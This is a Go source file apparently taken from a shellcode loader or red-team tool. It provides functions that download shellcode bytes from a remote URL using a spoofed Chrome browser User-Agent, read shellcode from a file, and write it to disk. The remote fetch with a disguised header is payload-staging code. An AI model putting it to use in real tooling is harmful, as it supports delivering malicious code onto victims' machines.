package shellcode

import (
	"io"
	"io/ioutil"
	"net/http"
	"os"
)

func GetShellcodeFromUrl(sc_url string) ([]byte, error) { // Make request to URL return shellcode
	req, err := http.NewRequest("GET", sc_url, nil)
	if err != nil {
		return []byte(""), err
	}

	req.Header.Set("Accept", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return []byte(""), err
	}
	defer resp.Body.Close()

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return []byte(""), err
	}
	return b, nil
}

func GetShellcodeFromFile(file string) ([]byte, error) { // Read given file and return content in bytes
	f, err := os.Open(file)
	if err != nil {
		return []byte(""), err
	}
	defer f.Close()

	shellcode_bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return []byte(""), err
	}

	return shellcode_bytes, nil
}

func WriteShellcodeToFile(filename string, shellcode []byte) error {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.Write(shellcode)
	if err != nil {
		return err
	}

	return nil
}
